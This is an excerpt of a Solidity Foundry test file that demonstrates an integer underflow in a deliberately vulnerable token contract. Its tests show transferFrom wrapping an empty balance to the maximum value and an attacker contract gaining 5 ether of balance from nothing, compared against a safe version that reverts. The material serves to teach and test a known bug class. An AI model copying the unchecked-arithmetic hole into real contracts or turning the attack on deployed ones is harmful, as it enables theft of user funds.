...
contract IntegerOverflowTest is Test {
    ...
    function setUp() public {
        ...
        vm.prank(alice); vuln.deposit{value: 5 ether}();
        vm.prank(bob);   vuln.deposit{value: 5 ether}();
    }
    ...
    function test_Underflow_WrapsZeroBalanceToMax() public {
        assertEq(vuln.balances(empty), 0, "empty address should have 0 balance");

        // transferFrom with empty as the from — 0 - 1 wraps inside unchecked{}
        vuln.transferFrom(empty, address(attacker), 1);

        assertEq(vuln.balances(empty),             type(uint256).max, "balance wrapped to max uint256");
        assertEq(vuln.balances(address(attacker)),  1,                "attacker credited 1 from nothing");
    ...
    function test_AttackGivesAttackerFreeBalance() public {
        assertEq(vuln.balances(address(attacker)), 0, "attacker starts with nothing");

        attacker.attack(empty, 5 ether);

        assertEq(vuln.balances(address(attacker)), 5 ether, "attacker has 5 ETH balance from nothing");

        console.log("Attacker stolen balance:", attacker.stolenBalance() / 1 ether, "units");
    }
    ...
    function test_Safe_TransferFrom_RevertsWithoutAllowance() public {
        ...
        vm.prank(alice); safe.deposit{value: 5 ether}();
    ...
    function test_Safe_ApproveAndTransferFrom_Works() public {
        vm.deal(alice, 5 ether);
        vm.prank(alice); safe.deposit{value: 5 ether}();
        vm.prank(alice); safe.approve(bob, 2 ether);
